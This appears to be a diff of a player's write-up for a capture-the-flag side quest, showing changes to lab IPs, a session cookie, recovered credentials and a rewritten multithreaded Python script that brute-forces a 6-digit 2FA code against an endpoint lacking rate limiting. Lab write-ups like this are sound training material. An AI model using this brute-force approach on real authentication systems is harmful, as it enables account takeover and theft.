@@ -4,7 +4,7 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.67.171.83
+- IP Address: 10.66.131.212
 - OS: 
 - Notes: 
 
@@ -46,7 +46,7 @@ throne123*
 
 //The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
 
-ip=10.67.171.83
+ip=10.66.131.212
 
 //This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
 
@@ -258,16 +258,19 @@ python flag2_solve.py
 #Account ID:	sbreachblocker@easterbunnies.thm
 #Pin/Password:	malharerocks 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-# RoadMap: (OTP email → 2FA → release)
 
 //Lets try using the same credentials we obtained for Hopflix to log in to the Hopsec Bank application.
 
 //Log in successful; however, after authentication, the application asks us to choose an email address to which a 2FA OTP code will be sent.
 
-- If PIN is correct, server returns trusted_emails or trusted_domains for OTP routing
+# Possible RoadMap: (OTP email → 2FA → release)
+- Server returns trusted_emails or trusted_domains for OTP routing
 - OTP is emailed (SMTP) and then verified by /api/verify-2fa
 - After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}
 
+- /api/bank-login → creates Flask session
+- /api/send-2fa → generates OTP for that session
+- /api/verify-2fa → checks OTP
 
 //Looking back at the code used to generate such code shows that it is truly random.
 
@@ -277,17 +280,17 @@ python flag2_solve.py
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 HTTP/2 200 OK
 Server: nginx/1.29.3
-Date: Sun, 01 Feb 2026 04:30:51 GMT
+Date: Mon, 02 Feb 2026 04:17:21 GMT
 Content-Type: application/json
 Content-Length: 115
 Vary: Cookie
-Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aX7W-w.a7t8N-CQclC63phRY3yShThF6Cg; HttpOnly; Path=/
+Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aYAlUQ.EfSR0OYbRtv-U4-QouM9KdUs-zQ; HttpOnly; Path=/
 
 {"requires_2fa":true,"success":true,"trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-//Also by clicking on Send OTP, a 6-digits OTP encrypted using AES, will be generated and stored inside the session, then sent to the user’s email address.
+//Also by clicking on 'Send OTP' button, a 6-digits OTP encrypted using AES, will be generated and stored inside the session, then sent to the user’s email address.
 
 
 // main.py (Send OTP)
@@ -306,6 +309,7 @@ Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6zn
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 //The /api/verify-2fa endpoint does not implement rate limiting, and while an invalid OTP deletes the stored code.
+
 
 // main.py (/api/verify-2fa)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -332,7 +336,7 @@ def verify_2fa():
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-//The authenticated session remains valid.
+//The authenticated session remains valid for each OTP request.
 
 //Because the session remains active and OTP attempts are unrestricted, the OTP verification mechanism can be abused through repeated attempts within the same authenticated session.
 
@@ -342,41 +346,86 @@ def verify_2fa():
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 import requests
 import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm
+import threading
 
 urllib3.disable_warnings()
 
-URL = "https://breachblocker.thm:8443/api/verify-2fa"
+BASE = "https://breachblocker.thm:8443"
+LOGIN  = f"{BASE}/api/bank-login"
+SEND   = f"{BASE}/api/send-2fa"
+VERIFY = f"{BASE}/api/verify-2fa"
 
-SESSION = "HopsecBank_SESSION"
+START = 100000
+END   = 1000000
+WORKERS = 20
 
-HEADERS = {
-    "Content-Type": "application/json",
-    "Cookie": f"session={SESSION}",
-    "Connection": "close"
-}
+stop_event = threading.Event()
 
-for i in range(100000, 1000000):
+def try_otp(i):
+    if stop_event.is_set():
+        return None
+
     otp = f"{i:06d}"
 
-    r = requests.post(
-        URL,
-        headers=HEADERS,
-        data=f'{{"code":"{otp}"}}',
-        verify=False,
-        allow_redirects=False,
-        timeout=3
-    )
+    try:
+        s = requests.Session()
+        s.verify = False
+        s.headers.update({
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0"
+        })
 
-    if "No 2FA code generated" in r.text:
-        print("[!] SESSION LOST – OTP DELETED")
-        print("Response:", r.text)
-        break
+        # Login
+        r = s.post(LOGIN, json={
+            "account_id": "sbreachblocker@easterbunnies.thm",
+            "pin": "malharerocks"
+        })
+        if not r.json().get("requires_2fa"):
+            return None
 
-    if len(r.text) != 25:
-        print("[+] OTP FOUND:", otp)
-        print("Status:", r.status_code)
-        print("Response:", r.text)
-        break
+        # Generate OTP
+        r = s.post(SEND, json={
+            "otp_email": "carrotbane@easterbunnies.thm"
+        })
+        if not r.json().get("success"):
+            return None
+
+        # One-shot OTP attempt
+        r = s.post(VERIFY, json={"code": otp})
+
+        if "Invalid" not in r.text:
+            stop_event.set()
+            return otp, r.text
+
+    except Exception:
+        return None
+
+    return None
+
+
+total = END - START
+
+with ThreadPoolExecutor(max_workers=WORKERS) as executor:
+    futures = [executor.submit(try_otp, i) for i in range(START, END)]
+
+    with tqdm(total=total,
+              desc="Bruteforcing OTP",
+              unit="otp",
+              dynamic_ncols=True) as pbar:
+
+        for future in as_completed(futures):
+            pbar.update(1)
+
+            result = future.result()
+            if result:
+                otp, response = result
+                pbar.close()
+                print(f"\n[+] OTP FOUND: {otp}")
+                print("[+] Response:", response)
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
